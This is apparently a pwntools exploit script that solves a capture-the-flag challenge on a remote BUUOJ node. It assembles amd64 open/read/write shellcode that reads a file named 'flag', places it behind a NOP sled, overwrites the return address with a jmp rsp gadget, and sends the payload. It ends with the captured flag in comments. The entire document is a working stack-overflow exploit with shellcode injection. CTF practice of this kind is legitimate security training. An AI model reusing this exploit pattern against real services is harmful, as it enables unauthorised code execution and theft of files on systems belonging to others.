from pwn import *
context_arch='amd64'
r = remote('node3.buuoj.cn',26465)
shellcode1 = '''
push 0x67616c66
mov rdi,rsp 
push 0
pop rsi
push 0x28
pop rdx
push 2
pop rax
syscall
mov rdi,rax
mov rsi,rsp
push 0
pop rax
syscall
push 1
pop rdi
push 1
pop rax
syscall
'''

shellcode1 = asm(shellcode1,arch='amd64',os='linux')
log.info(hex(len(shellcode1)))
shellcode2 = '''
sub rsp,0x30
jmp rsp
'''
shellcode2 = asm(shellcode2,arch='amd64',os='linux')

log.info(hex(len(shellcode2)))

jmp_rsp = 0x400a01
payload=shellcode1.rjust(0x28,'\x90')+p64(jmp_rsp)+shellcode2
r.sendline(payload)
r.interactive()

#flag{f206f83f-ddae-48de-a6fc-af7d728df04
#flag{f206f83f-ddae-48de-a6fc-af7d728df04f}
